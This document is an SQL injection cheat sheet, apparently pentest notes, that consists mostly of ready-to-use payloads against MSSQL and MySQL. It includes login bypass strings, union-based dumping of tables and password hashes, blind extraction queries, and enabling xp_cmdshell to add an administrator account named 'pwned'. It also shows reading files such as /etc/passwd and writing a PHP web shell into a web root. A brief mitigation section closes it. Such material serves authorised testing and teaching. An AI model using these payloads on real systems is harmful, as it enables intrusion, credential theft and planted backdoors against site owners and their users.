# SQL

## SQLI impact

* Bypass auth
* Dump DB
* Find passwords, re-use in SSH, etc
* MySql: read sensitive files, write arbitrary files \(backdoor\).
* MsSql: Code execution
* Run exploits for that db version

## Taxonomy

* Inband **error** based
  * The syntax error is shown in the response and it can be used to get results, may be enough to enumerate the db.
* Inband **union** based:
  * Union operator to combine the results with another query and enumerate
* Blind **boolean** based
  * You can not trigger any database output in the response, but cause differences in the app behaviour \(true/false\).
* Blind **time** based
  * Same as Boolean based, but causing a time delay rather than significant response differences.
* **Outband** or second order
  * The query is executed in another thread/process and no side effects in the inband response can be produce. Test it with a ping back or finding the correct end-point to trigger it.

## Identifying SQLI

* Test error based sending **' " ;** and look for errors.
* Test for boolean based sending **' or '1'='1** or **or 1=1** and look for differences.
* Other boolean payloads:

  ```text
  2' or '1'='1
  ' or 1=1 --
  a' or 1=1 --
  " or 1=1 --
  a" or 1=1 --
  ' or 1=1 #
  " or 1=1 #
  or 1=1 --
  ' or 'x'='x
  " or "x"="x
  ') or ('x'='x
  ") or ("x"="x
  ' or username LIKE '%admin%
  ```

* Payloads, where username is 'admin':

  ```text
  ' or ( 1=1 and username='admin');
  admin' --
  %bf%27 or 1=1 --
  ```

## MsSqli exploitation

* Find injectable parameter, doing do boolean based:

  ```text
  1002' or '1'='1
  1002' and '1'='1
  1002' and '1'='2
  ```

* Find injectable parameter with time delays:

  ```text
  XX'; WAITFOR DELAY '0:0:5'--
  ```

* If it works you can try to enable xp\_cmdshell:

  ```text
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```

* Test xp\_cmdshell using a time delay:

  ```text
  ';exec master..xp_cmdshell 'ping -n 5 127.0.0.1'; --
  ```

* Add user

  ```text
  ';exec master..xp_cmdshell 'net user pwned 1234 /ADD && net localgroup administrators pwned /ADD'; --
  ```

* If it did not work, try enumerating the database. Find col until no error tells you the columns:

  ```text
  1002' ORDER BY 1--
  1002' ORDER BY 2--
  1002' ORDER BY 3--
  ```

* Run union query with num of cols:

  ```text
  1002' UNION ALL SELECT null,NULL,NULL,NULL--
  ```

* Get data:

  ```text
  ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
  ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(HOST_NAME() AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
  ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(INJECTED_FUNCTION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--

  DB_NAME()
  user_name();
  system_user
  ```

* Get hashes

  ```text
  1002' UNION ALL SELECT NULL,CHAR(113)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(98)+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS NVARCHAR(4000)),CHAR(32))+CHAR(113),NULL,NULL FROM master..sysxlogins--
  ```

## MsSql error-based Exploitation

* Group by and **having** can be used to specify a search condition for a group and aggregate the result.
  * Sending **' having 1=1--** should produce **column 'table.column1' is invalid**
  * 2. Sending **' group by table.column1 having 1=1--** should produce **column 'table.column2' is invalid**
  * 3. Sending **' group by table.column1,table.column2 having 1=1--** should end up generating no error when you specify all the columns.
* You can generate error and get debug info:
  * Sending **convert\(int, @@version\)--** should trigger the error **failed when convering SQL Server...**\*
* Other payloads:

  ```text
  convert(int,user_name())--
  convert(int, @@db_name())--
  ```

* If the DB runs as SA, you can run **XP\_CMDSHELL** to get code execution.
* Useful queries:

  ```text
  SELECT Distinct TABLE_NAME FROM information_schema.TABLES
  exec master.dbo.xp_cmdshell 'CMD'
  ```

## MsSqlI blind exploitation

* For numeric contexts \(look for differences\):

  ```text
  and 1=1
  and 1=2
  ```

* Once we found the injection, we can leak data from the DB by guessing one character at a time as follows:

  ```text
  AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
  ```

* if it is true, we know the db\_name starts with 109\(m\).
* Ask if the first character of the user is 'a':

  ```text
  and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”
  ```

* Check if the admin table exists:

  ```text
  and IF(SUBSTRING ((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)
  ```

Finding number of columns using ORDER BY

* We can use order by to sort the result by a given column number, if the column does not exist, we will get an error:

  ```text
  vuln.php?id=1 order by 9 # This throws no error
  vuln.php?id=1 order by 10 # This throws error
  ```

MySql UNION code execution

* Joins the result of two queries
  * Two queries should return the same \# of columns.
  * Data-types in columns of the select must be of the same orcompatible type.
* Once you have the right number of columns \(i.e. 3\) you can find the mysql version:

  ```text
  UNION SELECT @@version,NULL, NULL#'
  ```

* mysql users:

  ```text
  UNION SELECT table_schema,NULL,NULL FROM information_schema.columns#'
  ```

* if the result displays garbage from the first query, you can add a false condition to only show the union result **AND 1=0 UNION...**
* Read files

  ```text
  AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
  ```

* Write files

  ```text
  AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
  ```

* Other payloads:

  ```text
  -1 union all select @@version --
  1 union SELECT user FROM mysql.user
  1 union select 'foo' into outfile '/tmp/foo'
  1 union select load_file('/etc/passwd')
  ```

## MySql UNION db leak

* First, identify vulnerable parameter by causing true and false conditions:

  ```text
  or 1=1 vs or 1=2
  and 1=2 vs and 1=1
  ```

* If the query is a select, the true should return all rows of the table and the other empty results.
* Next step is to gess the number of columns, you can do that by sending an union statement, you will get an error until you guess it:

  ```text
  id=1 union all select 1
  id=1 union all select 1,2
  id=1 union all select 1,2,3
  ...
  ```

* You can get the name of the database by sending:

  ```text
  ?id=1 union all select 1,2,3,4,5 from XXX
  Table 'gallery.XXX' doesn't existCould not select category
  ```

* You can use a comment \*\#\* to finish the query, in case there is a group by after the context of the injection. You can select the users and passwords form the database with:

  ```text
  id=1 union all (select 1,2,3,4,5,6 from mysql.user)#
  ```

* Leak the password:

  ```text
  1 union (select password,2,3,4,5,6 from mysql.user)#
  ```

* Should produce:

  ```text
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1
  ```

* Find current user

  ```text
  SELECT user();
  SELECT system_user();
  ```

* List all Users

  ```text
  SELECT user FROM mysql.user;
  ```

* List password hashes

  ```text
  SELECT host, user, password FROM mysql.user;
  ```

* List databases

  ```text
  SELECT schema_name FROM information_schema.schemata;
  SELECT distinct(db) FROM mysql.db
  ```

* List columns

  ```text
  SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
  ```

* List tables

  ```text
  SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
  ```

* Exfiltrate the different rows of the table. First, find the number of rows in the table:

  ```text
  aa' UNION SELECT count(*), users.password FROM users; --
  ```

* Then select each row:

  ```text
  aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --
  ```

  ```text
  aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --
  ```

  ```text
  aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --
  ```

* Exfiltrate the different rows of the table:

  ```text
  ' or 'x'='x' order by 1 desc --
  ' or 'x'='x' order by 2 desc --
  ...
  ```

## MySql in-band, union based SQLI exploitation

* Enumerate user

  ```text
  ?id=1 union select 1,2,3,4,user(),6,7,8,9
  ```

* Enumerate version

  ```text
  ?id=1 union select 1,2,3,4,version(),6,7,8,9
  ```

* Get all tables

  ```text
  ?=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables
  ```

* Get all values from a specific column:

  ```text
  ?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'
  ```

* Get username and password with a delimiter:

  ```text
  id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users
  ```

* Getting a shell

  ```text
  ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
  ```

* Non interactive shell:
* echo 'use mysql; select \* from user;' \| mysql -uroot -h127.0.0.1

SQLI login bypass

* ```text
  -'
  ' '
  '&'
  '^'
  '*'
  ' or ''-'
  ' or '' '
  ' or ''&'
  ' or ''^'
  ' or ''*'
  "-"
  " "
  "&"
  "^"
  "*"
  " or ""-"
  " or "" "
  " or ""&"
  " or ""^"
  " or ""*"
  or true--
  " or true--
  ' or true--
  ") or true--
  ') or true--
  ' or 'x'='x
  ') or ('x')=('x
  ')) or (('x'))=(('x
  " or "x"="x
  ") or ("x")=("x
  ")) or (("x"))=(("x
  ```

## Other tricks

* If space is filtered, you can use /\*\*/ instead
* Sometimes you can bypassfilter by adding a new line; I.e. 123%0aor 1=1
* try boolean sqli using **num=123** vs **num=123--** \(comments out the rest of the query\)

Object to relational mapping \(ORM\) injection

* Try vectors like

  ```text
  \'
  \"
  OR 1--
  ```

Mitigation

* Parameterized Queries

  ```text
  "SELECT * FROM foo WHERE bar = ? ".setString( 1, var);
  ```

* Stored Procedures \(with parameterized queries\)

  ```text
  connection.prepareCall("{call sp_getAccountBalance(?)}").setString(1, custname);
  ```

* White List Input Validation
* Escaping All User Supplied Input
* Additional defenses
  * Least Privilege
  * White List Input Validation
  * Views
  * SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables

